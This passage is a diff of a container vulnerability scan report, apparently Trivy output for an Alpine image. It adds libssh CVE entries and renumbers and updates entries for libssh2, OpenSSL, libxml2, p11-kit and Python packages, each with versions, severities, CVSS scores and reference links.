+│                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssh@0.12.0-r0?arch=x86_64&distro=3
+│                       │       │                  │       .24.0_alpha20260127 
+│                       │       │                  ╰ UID : 5849b769800139b 
+│                       │       ├ InstalledVersion: 0.12.0-r0 
+│                       │       ├ FixedVersion    : 0.12.1-r0 
+│                       │       ├ Status          : fixed 
+│                       │       ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e12
+│                       │       │                  │         79a8305ba35c82bf9229f 
+│                       │       │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680
+│                       │       │                            f7ea46f72dd8aa890c14b 
+│                       │       ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59846 
+│                       │       ├ DataSource       ╭ ID  : alpine 
+│                       │       │                  ├ Name: Alpine Secdb 
+│                       │       │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │       ├ Fingerprint     : sha256:7eaf1aced70f21d975172929e71e05c84ac515e086e89cfaf681
+│                       │       │                   f2c5aeb41b82 
+│                       │       ├ Title           : libssh: libssh: information disclosure via ProxyCommand %r
+│                       │       │                   username expansion 
+│                       │       ├ Description     : A flaw was found in libssh. A malicious username expanded
+│                       │       │                   through %r in ProxyCommand handling can inject shell
+│                       │       │                   metacharacters, exposing environment variables and causing
+│                       │       │                   unintended shell behavior. 
+│                       │       ├ Severity        : LOW 
+│                       │       ├ VendorSeverity   ─ redhat: 1 
+│                       │       ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:
+│                       │       │                           │           L/A:N 
+│                       │       │                           ╰ V3Score : 3.9 
+│                       │       ├ References       ╭ [0]: https://access.redhat.com/errata/RHSA-2026:42922 
+│                       │       │                  ├ [1]: https://access.redhat.com/security/cve/CVE-2026-59846 
+│                       │       │                  ├ [2]: https://bugzilla.redhat.com/show_bug.cgi?id=2498179 
+│                       │       │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-59846 
+│                       │       │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-59846 
+│                       │       ├ PublishedDate   : 2026-07-21T13:17:18.143Z 
+│                       │       ╰ LastModifiedDate: 2026-07-22T20:17:03.777Z 
+│                       ├ [95]  ╭ VulnerabilityID : CVE-2026-59849 
+│                       │       ├ PkgID           : libssh@0.12.0-r0 
+│                       │       ├ PkgName         : libssh 
+│                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssh@0.12.0-r0?arch=x86_64&distro=3
+│                       │       │                  │       .24.0_alpha20260127 
+│                       │       │                  ╰ UID : 5849b769800139b 
+│                       │       ├ InstalledVersion: 0.12.0-r0 
+│                       │       ├ FixedVersion    : 0.12.1-r0 
+│                       │       ├ Status          : fixed 
+│                       │       ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e12
+│                       │       │                  │         79a8305ba35c82bf9229f 
+│                       │       │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680
+│                       │       │                            f7ea46f72dd8aa890c14b 
+│                       │       ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59849 
+│                       │       ├ DataSource       ╭ ID  : alpine 
+│                       │       │                  ├ Name: Alpine Secdb 
+│                       │       │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │       ├ Fingerprint     : sha256:9e4aa6dba00680b548d5a1a721783ac5313e637a62615143efe3
+│                       │       │                   f0c8374bd47e 
+│                       │       ├ Title           : libssh: libssh: denial of service via automatic certificate
+│                       │       │                    authentication loop 
+│                       │       ├ Description     : A flaw was found in libssh. Logic errors in automatic
+│                       │       │                   certificate-based public key authentication can cause
+│                       │       │                   libssh clients to loop indefinitely when configured
+│                       │       │                   certificates are missing or repeatedly rejected by a
+│                       │       │                   server, leading to denial of service. 
+│                       │       ├ Severity        : LOW 
+│                       │       ├ CweIDs           ─ [0]: CWE-835 
+│                       │       ├ VendorSeverity   ─ redhat: 1 
+│                       │       ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:
+│                       │       │                           │           N/A:L 
+│                       │       │                           ╰ V3Score : 3.1 
+│                       │       ├ References       ╭ [0]: https://access.redhat.com/errata/RHSA-2026:42922 
+│                       │       │                  ├ [1]: https://access.redhat.com/security/cve/CVE-2026-59849 
+│                       │       │                  ├ [2]: https://bugzilla.redhat.com/show_bug.cgi?id=2498182 
+│                       │       │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-59849 
+│                       │       │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-59849 
+│                       │       ├ PublishedDate   : 2026-07-21T15:16:37.647Z 
+│                       │       ╰ LastModifiedDate: 2026-07-22T20:17:04.277Z 
+│                       ├ [96]  ╭ VulnerabilityID : CVE-2026-55199 
 │                       │       ├ PkgID           : libssh2@1.11.1-r1 
 │                       │       ├ PkgName         : libssh2 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssh2@1.11.1-r1?arch=x86_64&distro=
@@ -5650,7 +6080,7 @@
 │                       │       │                         entication-dos-via-ssh-msg-ext-info-handler 
 │                       │       ├ PublishedDate   : 2026-06-17T20:17:28.52Z 
 │                       │       ╰ LastModifiedDate: 2026-07-14T22:17:17.043Z 
-│                       ├ [86]  ╭ VulnerabilityID : CVE-2026-55200 
+│                       ├ [97]  ╭ VulnerabilityID : CVE-2026-55200 
 │                       │       ├ PkgID           : libssh2@1.11.1-r1 
 │                       │       ├ PkgName         : libssh2 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssh2@1.11.1-r1?arch=x86_64&distro=
@@ -5716,7 +6146,7 @@
 │                       │       │                         c 
 │                       │       ├ PublishedDate   : 2026-06-17T20:17:28.667Z 
 │                       │       ╰ LastModifiedDate: 2026-07-14T22:17:17.183Z 
-│                       ├ [87]  ╭ VulnerabilityID : CVE-2026-7598 
+│                       ├ [98]  ╭ VulnerabilityID : CVE-2026-7598 
 │                       │       ├ PkgID           : libssh2@1.11.1-r1 
 │                       │       ├ PkgName         : libssh2 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssh2@1.11.1-r1?arch=x86_64&distro=
@@ -5781,7 +6211,7 @@
 │                       │       │                  ╰ [13]: https://www.cve.org/CVERecord?id=CVE-2026-7598 
 │                       │       ├ PublishedDate   : 2026-05-01T22:16:16.947Z 
 │                       │       ╰ LastModifiedDate: 2026-07-15T01:17:01.19Z 
-│                       ├ [88]  ╭ VulnerabilityID : CVE-2026-45447 
+│                       ├ [99]  ╭ VulnerabilityID : CVE-2026-45447 
 │                       │       ├ PkgID           : libssl3@3.5.6-r0 
 │                       │       ├ PkgName         : libssl3 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssl3@3.5.6-r0?arch=x86_64&distro=3
@@ -5946,8 +6376,8 @@
 │                       │       │                  ├ [71]: https://ubuntu.com/security/notices/USN-8414-2 
 │                       │       │                  ╰ [72]: https://www.cve.org/CVERecord?id=CVE-2026-45447 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:19.277Z 
-│                       │       ╰ LastModifiedDate: 2026-07-15T14:18:11.573Z 
-│                       ├ [89]  ╭ VulnerabilityID : CVE-2026-34182 
+│                       │       ╰ LastModifiedDate: 2026-07-20T12:19:30.657Z 
+│                       ├ [100] ╭ VulnerabilityID : CVE-2026-34182 
 │                       │       ├ PkgID           : libssl3@3.5.6-r0 
 │                       │       ├ PkgName         : libssl3 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssl3@3.5.6-r0?arch=x86_64&distro=3
@@ -6113,7 +6543,7 @@
 │                       │       │                  ╰ [60]: https://www.cve.org/CVERecord?id=CVE-2026-34182 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:04.857Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:38:36.97Z 
-│                       ├ [90]  ╭ VulnerabilityID : CVE-2026-34183 
+│                       ├ [101] ╭ VulnerabilityID : CVE-2026-34183 
 │                       │       ├ PkgID           : libssl3@3.5.6-r0 
 │                       │       ├ PkgName         : libssl3 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssl3@3.5.6-r0?arch=x86_64&distro=3
@@ -6255,7 +6685,7 @@
 │                       │       │                  ╰ [58]: https://www.cve.org/CVERecord?id=CVE-2026-34183 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:05Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:38:37.143Z 
-│                       ├ [91]  ╭ VulnerabilityID : CVE-2026-42764 
+│                       ├ [102] ╭ VulnerabilityID : CVE-2026-42764 
 │                       │       ├ PkgID           : libssl3@3.5.6-r0 
 │                       │       ├ PkgName         : libssl3 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssl3@3.5.6-r0?arch=x86_64&distro=3
@@ -6394,7 +6824,7 @@
 │                       │       │                  ╰ [57]: https://www.cve.org/CVERecord?id=CVE-2026-42764 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:07.693Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:48:21.63Z 
-│                       ├ [92]  ╭ VulnerabilityID : CVE-2026-45445 
+│                       ├ [103] ╭ VulnerabilityID : CVE-2026-45445 
 │                       │       ├ PkgID           : libssl3@3.5.6-r0 
 │                       │       ├ PkgName         : libssl3 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssl3@3.5.6-r0?arch=x86_64&distro=3
@@ -6572,7 +7002,7 @@
 │                       │       │                  ╰ [59]: https://www.cve.org/CVERecord?id=CVE-2026-45445 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:18.993Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:52:03.793Z 
-│                       ├ [93]  ╭ VulnerabilityID : CVE-2026-34180 
+│                       ├ [104] ╭ VulnerabilityID : CVE-2026-34180 
 │                       │       ├ PkgID           : libssl3@3.5.6-r0 
 │                       │       ├ PkgName         : libssl3 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssl3@3.5.6-r0?arch=x86_64&distro=3
@@ -6725,7 +7155,7 @@
 │                       │       │                  ╰ [60]: https://www.cve.org/CVERecord?id=CVE-2026-34180 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:04.6Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:38:36.66Z 
-│                       ├ [94]  ╭ VulnerabilityID : CVE-2026-34181 
+│                       ├ [105] ╭ VulnerabilityID : CVE-2026-34181 
 │                       │       ├ PkgID           : libssl3@3.5.6-r0 
 │                       │       ├ PkgName         : libssl3 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssl3@3.5.6-r0?arch=x86_64&distro=3
@@ -6863,7 +7293,7 @@
 │                       │       │                  ╰ [58]: https://www.cve.org/CVERecord?id=CVE-2026-34181 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:04.74Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:38:36.82Z 
-│                       ├ [95]  ╭ VulnerabilityID : CVE-2026-42766 
+│                       ├ [106] ╭ VulnerabilityID : CVE-2026-42766 
 │                       │       ├ PkgID           : libssl3@3.5.6-r0 
 │                       │       ├ PkgName         : libssl3 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssl3@3.5.6-r0?arch=x86_64&distro=3
@@ -7008,7 +7438,7 @@
 │                       │       │                  ╰ [60]: https://www.cve.org/CVERecord?id=CVE-2026-42766 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:07.97Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:48:21.947Z 
-│                       ├ [96]  ╭ VulnerabilityID : CVE-2026-42767 
+│                       ├ [107] ╭ VulnerabilityID : CVE-2026-42767 
 │                       │       ├ PkgID           : libssl3@3.5.6-r0 
 │                       │       ├ PkgName         : libssl3 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssl3@3.5.6-r0?arch=x86_64&distro=3
@@ -7149,7 +7579,7 @@
 │                       │       │                  ╰ [59]: https://www.cve.org/CVERecord?id=CVE-2026-42767 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:08.093Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:48:22.107Z 
-│                       ├ [97]  ╭ VulnerabilityID : CVE-2026-42768 
+│                       ├ [108] ╭ VulnerabilityID : CVE-2026-42768 
 │                       │       ├ PkgID           : libssl3@3.5.6-r0 
 │                       │       ├ PkgName         : libssl3 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssl3@3.5.6-r0?arch=x86_64&distro=3
@@ -7342,7 +7772,7 @@
 │                       │       │                  ╰ [58]: https://www.cve.org/CVERecord?id=CVE-2026-42768 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:08.223Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:48:22.263Z 
-│                       ├ [98]  ╭ VulnerabilityID : CVE-2026-42769 
+│                       ├ [109] ╭ VulnerabilityID : CVE-2026-42769 
 │                       │       ├ PkgID           : libssl3@3.5.6-r0 
 │                       │       ├ PkgName         : libssl3 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssl3@3.5.6-r0?arch=x86_64&distro=3
@@ -7508,7 +7938,7 @@
 │                       │       │                  ╰ [58]: https://www.cve.org/CVERecord?id=CVE-2026-42769 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:08.377Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:48:22.467Z 
-│                       ├ [99]  ╭ VulnerabilityID : CVE-2026-42770 
+│                       ├ [110] ╭ VulnerabilityID : CVE-2026-42770 
 │                       │       ├ PkgID           : libssl3@3.5.6-r0 
 │                       │       ├ PkgName         : libssl3 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssl3@3.5.6-r0?arch=x86_64&distro=3
@@ -7568,7 +7998,7 @@
 │                       │       │                   using X9.42 DHX static keys with interactive protocols and
 │                       │       │                   therefore this
 │                       │       │                   issue was assigned Low severity.
-│                       │       │                   The FIPS modules in 4.0, 3.6, 3.5, 3.4, and 3.0 are
+│                       │       │                   The FIPS modules in 4.0, 3.6, 3.5, 3.4, 3.1.2 and 3.0 are
 │                       │       │                   affected by this
 │                       │       │                   issue. 
 │                       │       ├ Severity        : LOW 
@@ -7664,8 +8094,8 @@
 │                       │       │                  ├ [58]: https://ubuntu.com/security/notices/USN-8414-1 
 │                       │       │                  ╰ [59]: https://www.cve.org/CVERecord?id=CVE-2026-42770 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:08.523Z 
-│                       │       ╰ LastModifiedDate: 2026-06-17T10:48:22.65Z 
-│                       ├ [100] ╭ VulnerabilityID : CVE-2026-45446 
+│                       │       ╰ LastModifiedDate: 2026-07-20T17:17:08.87Z 
+│                       ├ [111] ╭ VulnerabilityID : CVE-2026-45446 
 │                       │       ├ PkgID           : libssl3@3.5.6-r0 
 │                       │       ├ PkgName         : libssl3 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssl3@3.5.6-r0?arch=x86_64&distro=3
@@ -7836,7 +8266,7 @@
 │                       │       │                  ╰ [59]: https://www.cve.org/CVERecord?id=CVE-2026-45446 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:19.137Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:52:03.967Z 
-│                       ├ [101] ╭ VulnerabilityID : CVE-2026-7383 
+│                       ├ [112] ╭ VulnerabilityID : CVE-2026-7383 
 │                       │       ├ PkgID           : libssl3@3.5.6-r0 
 │                       │       ├ PkgName         : libssl3 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssl3@3.5.6-r0?arch=x86_64&distro=3
@@ -7997,7 +8427,7 @@
 │                       │       │                  ╰ [60]: https://www.cve.org/CVERecord?id=CVE-2026-7383 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:50.337Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T11:02:19.433Z 
-│                       ├ [102] ╭ VulnerabilityID : CVE-2026-9076 
+│                       ├ [113] ╭ VulnerabilityID : CVE-2026-9076 
 │                       │       ├ PkgID           : libssl3@3.5.6-r0 
 │                       │       ├ PkgName         : libssl3 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libssl3@3.5.6-r0?arch=x86_64&distro=3
@@ -8163,7 +8593,7 @@
 │                       │       │                  ╰ [60]: https://www.cve.org/CVERecord?id=CVE-2026-9076 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:50.997Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T11:04:47.973Z 
-│                       ├ [103] ╭ VulnerabilityID : CVE-2026-6732 
+│                       ├ [114] ╭ VulnerabilityID : CVE-2026-6732 
 │                       │       ├ PkgID           : libxml2@2.13.9-r1 
 │                       │       ├ PkgName         : libxml2 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/libxml2@2.13.9-r1?arch=x86_64&distro=
@@ -8216,7 +8646,7 @@
 │                       │       │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-6732 
 │                       │       ├ PublishedDate   : 2026-04-23T23:16:16.443Z 
 │                       │       ╰ LastModifiedDate: 2026-06-30T20:16:50.03Z 
-│                       ├ [104] ╭ VulnerabilityID : CVE-2026-45447 
+│                       ├ [115] ╭ VulnerabilityID : CVE-2026-45447 
 │                       │       ├ PkgID           : openssl@3.5.6-r0 
 │                       │       ├ PkgName         : openssl 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openssl@3.5.6-r0?arch=x86_64&distro=3
@@ -8381,8 +8811,8 @@
 │                       │       │                  ├ [71]: https://ubuntu.com/security/notices/USN-8414-2 
 │                       │       │                  ╰ [72]: https://www.cve.org/CVERecord?id=CVE-2026-45447 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:19.277Z 
-│                       │       ╰ LastModifiedDate: 2026-07-15T14:18:11.573Z 
-│                       ├ [105] ╭ VulnerabilityID : CVE-2026-34182 
+│                       │       ╰ LastModifiedDate: 2026-07-20T12:19:30.657Z 
+│                       ├ [116] ╭ VulnerabilityID : CVE-2026-34182 
 │                       │       ├ PkgID           : openssl@3.5.6-r0 
 │                       │       ├ PkgName         : openssl 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openssl@3.5.6-r0?arch=x86_64&distro=3
@@ -8548,7 +8978,7 @@
 │                       │       │                  ╰ [60]: https://www.cve.org/CVERecord?id=CVE-2026-34182 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:04.857Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:38:36.97Z 
-│                       ├ [106] ╭ VulnerabilityID : CVE-2026-34183 
+│                       ├ [117] ╭ VulnerabilityID : CVE-2026-34183 
 │                       │       ├ PkgID           : openssl@3.5.6-r0 
 │                       │       ├ PkgName         : openssl 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openssl@3.5.6-r0?arch=x86_64&distro=3
@@ -8690,7 +9120,7 @@
 │                       │       │                  ╰ [58]: https://www.cve.org/CVERecord?id=CVE-2026-34183 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:05Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:38:37.143Z 
-│                       ├ [107] ╭ VulnerabilityID : CVE-2026-42764 
+│                       ├ [118] ╭ VulnerabilityID : CVE-2026-42764 
 │                       │       ├ PkgID           : openssl@3.5.6-r0 
 │                       │       ├ PkgName         : openssl 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openssl@3.5.6-r0?arch=x86_64&distro=3
@@ -8829,7 +9259,7 @@
 │                       │       │                  ╰ [57]: https://www.cve.org/CVERecord?id=CVE-2026-42764 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:07.693Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:48:21.63Z 
-│                       ├ [108] ╭ VulnerabilityID : CVE-2026-45445 
+│                       ├ [119] ╭ VulnerabilityID : CVE-2026-45445 
 │                       │       ├ PkgID           : openssl@3.5.6-r0 
 │                       │       ├ PkgName         : openssl 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openssl@3.5.6-r0?arch=x86_64&distro=3
@@ -9007,7 +9437,7 @@
 │                       │       │                  ╰ [59]: https://www.cve.org/CVERecord?id=CVE-2026-45445 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:18.993Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:52:03.793Z 
-│                       ├ [109] ╭ VulnerabilityID : CVE-2026-34180 
+│                       ├ [120] ╭ VulnerabilityID : CVE-2026-34180 
 │                       │       ├ PkgID           : openssl@3.5.6-r0 
 │                       │       ├ PkgName         : openssl 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openssl@3.5.6-r0?arch=x86_64&distro=3
@@ -9160,7 +9590,7 @@
 │                       │       │                  ╰ [60]: https://www.cve.org/CVERecord?id=CVE-2026-34180 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:04.6Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:38:36.66Z 
-│                       ├ [110] ╭ VulnerabilityID : CVE-2026-34181 
+│                       ├ [121] ╭ VulnerabilityID : CVE-2026-34181 
 │                       │       ├ PkgID           : openssl@3.5.6-r0 
 │                       │       ├ PkgName         : openssl 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openssl@3.5.6-r0?arch=x86_64&distro=3
@@ -9298,7 +9728,7 @@
 │                       │       │                  ╰ [58]: https://www.cve.org/CVERecord?id=CVE-2026-34181 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:04.74Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:38:36.82Z 
-│                       ├ [111] ╭ VulnerabilityID : CVE-2026-42766 
+│                       ├ [122] ╭ VulnerabilityID : CVE-2026-42766 
 │                       │       ├ PkgID           : openssl@3.5.6-r0 
 │                       │       ├ PkgName         : openssl 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openssl@3.5.6-r0?arch=x86_64&distro=3
@@ -9443,7 +9873,7 @@
 │                       │       │                  ╰ [60]: https://www.cve.org/CVERecord?id=CVE-2026-42766 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:07.97Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:48:21.947Z 
-│                       ├ [112] ╭ VulnerabilityID : CVE-2026-42767 
+│                       ├ [123] ╭ VulnerabilityID : CVE-2026-42767 
 │                       │       ├ PkgID           : openssl@3.5.6-r0 
 │                       │       ├ PkgName         : openssl 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openssl@3.5.6-r0?arch=x86_64&distro=3
@@ -9584,7 +10014,7 @@
 │                       │       │                  ╰ [59]: https://www.cve.org/CVERecord?id=CVE-2026-42767 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:08.093Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:48:22.107Z 
-│                       ├ [113] ╭ VulnerabilityID : CVE-2026-42768 
+│                       ├ [124] ╭ VulnerabilityID : CVE-2026-42768 
 │                       │       ├ PkgID           : openssl@3.5.6-r0 
 │                       │       ├ PkgName         : openssl 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openssl@3.5.6-r0?arch=x86_64&distro=3
@@ -9777,7 +10207,7 @@
 │                       │       │                  ╰ [58]: https://www.cve.org/CVERecord?id=CVE-2026-42768 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:08.223Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:48:22.263Z 
-│                       ├ [114] ╭ VulnerabilityID : CVE-2026-42769 
+│                       ├ [125] ╭ VulnerabilityID : CVE-2026-42769 
 │                       │       ├ PkgID           : openssl@3.5.6-r0 
 │                       │       ├ PkgName         : openssl 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openssl@3.5.6-r0?arch=x86_64&distro=3
@@ -9943,7 +10373,7 @@
 │                       │       │                  ╰ [58]: https://www.cve.org/CVERecord?id=CVE-2026-42769 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:08.377Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:48:22.467Z 
-│                       ├ [115] ╭ VulnerabilityID : CVE-2026-42770 
+│                       ├ [126] ╭ VulnerabilityID : CVE-2026-42770 
 │                       │       ├ PkgID           : openssl@3.5.6-r0 
 │                       │       ├ PkgName         : openssl 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openssl@3.5.6-r0?arch=x86_64&distro=3
@@ -10003,7 +10433,7 @@
 │                       │       │                   using X9.42 DHX static keys with interactive protocols and
 │                       │       │                   therefore this
 │                       │       │                   issue was assigned Low severity.
-│                       │       │                   The FIPS modules in 4.0, 3.6, 3.5, 3.4, and 3.0 are
+│                       │       │                   The FIPS modules in 4.0, 3.6, 3.5, 3.4, 3.1.2 and 3.0 are
 │                       │       │                   affected by this
 │                       │       │                   issue. 
 │                       │       ├ Severity        : LOW 
@@ -10099,8 +10529,8 @@
 │                       │       │                  ├ [58]: https://ubuntu.com/security/notices/USN-8414-1 
 │                       │       │                  ╰ [59]: https://www.cve.org/CVERecord?id=CVE-2026-42770 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:08.523Z 
-│                       │       ╰ LastModifiedDate: 2026-06-17T10:48:22.65Z 
-│                       ├ [116] ╭ VulnerabilityID : CVE-2026-45446 
+│                       │       ╰ LastModifiedDate: 2026-07-20T17:17:08.87Z 
+│                       ├ [127] ╭ VulnerabilityID : CVE-2026-45446 
 │                       │       ├ PkgID           : openssl@3.5.6-r0 
 │                       │       ├ PkgName         : openssl 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openssl@3.5.6-r0?arch=x86_64&distro=3
@@ -10271,7 +10701,7 @@
 │                       │       │                  ╰ [59]: https://www.cve.org/CVERecord?id=CVE-2026-45446 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:19.137Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:52:03.967Z 
-│                       ├ [117] ╭ VulnerabilityID : CVE-2026-7383 
+│                       ├ [128] ╭ VulnerabilityID : CVE-2026-7383 
 │                       │       ├ PkgID           : openssl@3.5.6-r0 
 │                       │       ├ PkgName         : openssl 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openssl@3.5.6-r0?arch=x86_64&distro=3
@@ -10432,7 +10862,7 @@
 │                       │       │                  ╰ [60]: https://www.cve.org/CVERecord?id=CVE-2026-7383 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:50.337Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T11:02:19.433Z 
-│                       ├ [118] ╭ VulnerabilityID : CVE-2026-9076 
+│                       ├ [129] ╭ VulnerabilityID : CVE-2026-9076 
 │                       │       ├ PkgID           : openssl@3.5.6-r0 
 │                       │       ├ PkgName         : openssl 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openssl@3.5.6-r0?arch=x86_64&distro=3
@@ -10598,7 +11028,7 @@
 │                       │       │                  ╰ [60]: https://www.cve.org/CVERecord?id=CVE-2026-9076 
 │                       │       ├ PublishedDate   : 2026-06-09T17:17:50.997Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T11:04:47.973Z 
-│                       ├ [119] ╭ VulnerabilityID : CVE-2026-2100 
+│                       ├ [130] ╭ VulnerabilityID : CVE-2026-2100 
 │                       │       ├ PkgID           : p11-kit@0.25.5-r2 
 │                       │       ├ PkgName         : p11-kit 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/p11-kit@0.25.5-r2?arch=x86_64&distro=
@@ -10664,7 +11094,7 @@
 │                       │       │                  ╰ [17]: https://www.cve.org/CVERecord?id=CVE-2026-2100 
 │                       │       ├ PublishedDate   : 2026-03-26T21:17:04.247Z 
 │                       │       ╰ LastModifiedDate: 2026-07-19T18:16:31.763Z 
-│                       ├ [120] ╭ VulnerabilityID : CVE-2026-3644 
+│                       ├ [131] ╭ VulnerabilityID : CVE-2026-3644 
 │                       │       ├ PkgID           : pyc@3.14.3-r0 
 │                       │       ├ PkgName         : pyc 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/pyc@3.14.3-r0?arch=x86_64&distro=3.24
@@ -10783,7 +11213,7 @@
 │                       │       │                  ╰ [52]: https://www.cve.org/CVERecord?id=CVE-2026-3644 
 │                       │       ├ PublishedDate   : 2026-03-16T18:16:09.907Z 
 │                       │       ╰ LastModifiedDate: 2026-06-30T16:16:50.613Z 
-│                       ├ [121] ╭ VulnerabilityID : CVE-2026-4224 
+│                       ├ [132] ╭ VulnerabilityID : CVE-2026-4224 
 │                       │       ├ PkgID           : pyc@3.14.3-r0 
 │                       │       ├ PkgName         : pyc 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/pyc@3.14.3-r0?arch=x86_64&distro=3.24
@@ -10906,7 +11336,7 @@
 │                       │       │                  ╰ [53]: https://www.cve.org/CVERecord?id=CVE-2026-4224 
 │                       │       ├ PublishedDate   : 2026-03-16T18:16:10.07Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:56:15.297Z 
-│                       ├ [122] ╭ VulnerabilityID : CVE-2026-2297 
